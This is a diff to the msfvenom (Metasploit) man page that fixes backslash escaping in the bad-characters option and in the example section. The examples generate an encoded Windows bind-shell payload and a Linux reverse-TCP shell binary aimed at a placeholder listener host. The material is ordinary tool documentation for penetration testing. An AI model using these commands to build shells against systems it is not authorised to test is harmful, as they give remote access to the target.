@@ -45,7 +45,7 @@ The maximum size of the resulting payload
       The maximum size of the encoded payload (defaults to the -s value)
 .TP
 -b, --bad-chars  [list]          
-The list of characters to avoid example: '\x00\xff'
+The list of characters to avoid example: '\\x00\\xff'
 .TP
 -i, --iterations  [count]         
 The number of times to encode the payload
@@ -74,9 +74,9 @@ Show this message
 --help-formats               
 List available formats
 .SH EXAMPLE
-msfvenom --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b "\x00" -f python
+msfvenom --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b "\\x00" -f python
 .br
-msfvenom --platform linux -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=443 -b "\x00" -f elf -o file.bin
+msfvenom --platform linux -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=443 -b "\\x00" -f elf -o file.bin
 .br
 
 
